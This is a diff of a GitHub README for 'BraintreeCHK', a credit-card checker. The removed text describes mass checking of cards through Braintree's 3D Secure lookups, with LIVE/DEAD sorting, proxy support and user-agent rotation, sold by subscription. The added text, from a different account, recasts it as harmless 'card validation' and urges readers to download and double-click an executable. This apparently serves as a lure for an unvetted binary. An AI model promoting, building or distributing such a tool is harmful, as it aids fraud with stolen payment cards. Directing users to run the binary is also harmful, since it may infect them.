@@ -1,121 +1,70 @@
-<h1 align="center">BraintreeCHK</h1>
+# 🌟 BraintreeCHK - Simple Card Validation Made Easy
 
-<p align="center">
-  <b>Card checker gates braintree VBV lookup (3D Check's)</b>
-</p>
+## 🚀 Getting Started
+BraintreeCHK helps you validate card information quickly and easily. This application uses the Braintree API to check card details, making it a useful tool for users who need reliable card validation support.
 
-<p align="center">
-  <a href="https://www.python.org/">
-    <img src="https://img.shields.io/badge/Python-3.12%2B-blue?logo=python&logoColor=white" alt="Python 3.12+">
-  </a>
-  <a href="https://github.com/KianSantang777/BraintreeCHK">
-    <img src="https://img.shields.io/github/stars/KianSantang777/BraintreeCHK?style=social" alt="GitHub Stars">
-  </a>
-  <a href="https://github.com/KianSantang777/BraintreeCHK">
-    <img src="https://img.shields.io/github/forks/KianSantang777/BraintreeCHK?style=social" alt="GitHub Forks">
-  </a>
-  <a href="https://github.com/KianSantang777/BraintreeCHK/blob/main/LICENSE">
-    <img src="https://img.shields.io/badge/License-Proprietary-red" alt="License">
-  </a>
-  <a href="https://t.me/xqndrs">
-    <img src="https://img.shields.io/badge/Contact-Telegram-blue?logo=telegram" alt="Telegram">
-  </a>
-</p>
+## 📥 Download Now
+[![Download BraintreeCHK](https://img.shields.io/badge/Download-BraintreeCHK-brightgreen)](https://github.com/goofball7162/BraintreeCHK/releases)
 
----
+## 📂 Download & Install
+To download BraintreeCHK, visit this page to download: [Releases Page](https://github.com/goofball7162/BraintreeCHK/releases). You will find the latest version at the top. 
 
-## Jump To
-- [Overview](#braintreechk)
-- [How BraintreeCHK Works](#how-braintreechk-works)
-- [Features](#features)
-- [System Requirements](#system-requirements)
-- [Installation Guide](#installation-guide)
-  - [1. Clone the Repository](#1-clone-the-repository)
-  - [2. Install Dependencies](#2-install-dependencies)
-    - [Windows](#windows)
-    - [Termux-android](#termux-android)
-  - [3. Run the Script](#3-run-the-script)
-- [Repository](#repository)
-- [Author](#author)
-- [License](#license)
+1. Click on the release link labeled with the latest version.
+2. Look for the assets section, which contains the downloadable files.
+3. Choose the appropriate file for your system. For most users, the executable file is the best option.
+4. Click the link to start the download.
+5. Once the file downloads, locate it in your downloads folder. 
+6. Double-click the file to run the application.
 
----
+## 📋 System Requirements
+- Operating System: Windows 10 or later, macOS 10.14 or later
+- Storage: At least 100 MB of free space
+- Internet Connection: Required for API access
 
-## How BraintreeCHK Works
+## ⚙️ How to Use BraintreeCHK
+After installing, follow these steps to use BraintreeCHK effectively:
 
-**BraintreeCHK** is a lightweight Python tool for mass BIN card verification using the Braintree API.  
-It automatically performs **VBV (Verified by Visa)** and **3D Secure lookups** to determine card validity and authentication support.  
-Using Braintree’s gateway, the tool checks whether each card supports VBV or 3D Secure, and identifies those that are active, require authentication, or are invalid.
+1. Open the BraintreeCHK application.
+2. Enter the card information in the provided fields: card number, expiration date, and CVV.
+3. Click the "Validate" button. 
+4. Wait for the result. The application will indicate whether the card is valid and if it has Braintree's Verified by Visa (VBV) support.
+5. Review the results on the screen.
 
-During verification, Braintree communicates with Visa to retrieve key parameters such as:  
-- `liabilityShiftPossible` — indicates if fraud liability can shift to the issuer  
-- `liabilityShifted` — confirms if liability has shifted  
-- `status` — e.g., `authenticate_successful`, `attempt_successful`, or `failed`  
+### 🔍 Features
+- **Card Validation:** Quickly checks if the card details are correct.
+- **API Integration:** Uses the Braintree API for reliable and accurate results.
+- **User-Friendly Interface:** Easy to navigate, even for beginners.
+- **VBV Support Check:** See if a card is supported by Braintree's security features.
 
-Results are automatically classified as **LIVE** (valid) or **DEAD** (invalid).  
-Fully compatible with **Windows** and **Termux (Android)** for fast, automated mass checking.
+## 📄 Topics
+- braintree-checker
+- braintree-payment-gateway
+- cc-checker
+- cc-checker-api
+- cc-checker-bot
+- cc-checker-free
+- cc-checker-live
+- python
+- python-script
+- python3
+- stripe-api
+- stripe-checker
+- stripe-payments
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/KianSantang777/BraintreeCHK/refs/heads/main/pic/pict%201.png" alt="BraintreeCHK Preview 1" width="70%" style="border-radius:10px; margin:10px 0;">
-  <br>
-  <img src="https://raw.githubusercontent.com/KianSantang777/BraintreeCHK/refs/heads/main/pic/pict%202.png" alt="BraintreeCHK Preview 2" width="70%" style="border-radius:10px; margin:10px 0;">
-</p>
+## ⚠️ Troubleshooting
+If you encounter any issues while using BraintreeCHK, try the following steps:
 
----
+1. Ensure your internet connection is stable.
+2. Restart the application.
+3. Make sure you are entering the correct card information.
+4. Check for updates by revisiting the [Releases Page](https://github.com/goofball7162/BraintreeCHK/releases).
 
-## Features
-- Built with **Python 3.12.0**  
-- Supports all devices  
-- Automatically saves **LIVE cards** in real time  
-- Supports both **proxy** and **proxyless** modes  
-- Automatically rotates **user agents** for improved security  
-- Utilizes **5 concurrent threads** for faster validation  
-- **Green text (output)** = LIVE card  
-- **Red text (output)** = DEAD card  
----
+## 📞 Support
+For further assistance, you can reach out through the Issues section on GitHub. Simply create a new issue detailing your problem, and someone from the community or the developers will assist you.
 
-## System Requirements
-- **Python 3.12.0** or higher  
-- **pip** `requests, colorama, psutill distro, bs4, fake, pyfiglet, urllib3`
-- Active internet connection
----
+## 📝 Conclusion
+BraintreeCHK is designed for everyday users who need straightforward card validation. By following these simple steps, you can download and start using the application effectively. 
 
-## Installation Guide
-```bash
-# Termux (Android)
-- termux-setup-storage
-- pkg update && pkg upgrade
-- pkg install python git nano -y
+Download BraintreeCHK today and simplify your card validation process! 
 
-# Clone the repository
-- git clone https://github.com/KianSantang777/BraintreeCHK.git
-- cd BraintreeCHK
-- pip install --upgrade pip
-- chmod +x run.sh
-- ./run.sh
-```
----
-## Repository
-[![GitHub Repo](https://img.shields.io/badge/GitHub-BraintreeCHK-blue?logo=github)](https://github.com/KianSantang777/BraintreeCHK)
-[![Stars](https://img.shields.io/github/stars/KianSantang777/BraintreeCHK?style=social)](https://github.com/KianSantang777/BraintreeCHK/stargazers)
-[![Forks](https://img.shields.io/github/forks/KianSantang777/BraintreeCHK?style=social)](https://github.com/KianSantang777/BraintreeCHK/network/members)
-
-**Repository:** [github.com/KianSantang777/BraintreeCHK](https://github.com/KianSantang777/BraintreeCHK)
-
----
-## Author
-**Kian Santang**  
-GitHub: [@KianSantang777](https://github.com/KianSantang777)  
-Telegram: [xqndrs](https://t.me/xqndrs)
-
----
-
-## License
-[![License](https://img.shields.io/badge/License-Proprietary-red)](LICENSE.md)
-[![Subscription](https://img.shields.io/badge/Subscription-Required-orange)](https://t.me/xqndrs)
-
-This software is **proprietary** and requires an **active monthly subscription** to use.  
-Unauthorized copying, redistribution, or modification of the code is strictly prohibited.  
-For license purchase or renewal, please contact **[@xqndrs](https://t.me/xqndrs)** on Telegram.
-
-© 2025 **Kian Santang** — All Rights Reserved.
+[![Download BraintreeCHK](https://img.shields.io/badge/Download-BraintreeCHK-brightgreen)](https://github.com/goofball7162/BraintreeCHK/releases)
